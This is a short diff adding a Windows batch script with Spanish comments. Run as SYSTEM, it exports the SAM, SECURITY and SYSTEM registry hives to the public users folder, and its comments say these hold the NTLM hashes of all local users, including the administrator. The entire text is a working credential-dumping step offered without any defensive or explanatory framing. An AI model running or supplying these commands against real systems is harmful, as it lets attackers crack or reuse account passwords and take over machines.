@@ -1,0 +1,6 @@
+:: Como SYSTEM, acceder a hashes de SAM
+reg save HKLM\SAM C:\Users\Public\sam.hiv
+reg save HKLM\SECURITY C:\Users\Public\security.hiv
+reg save HKLM\SYSTEM C:\Users\Public\system.hiv
+:: Estos ficheros contienen los hashes NTLM de todos los
+:: usuarios locales, incluido el administrador
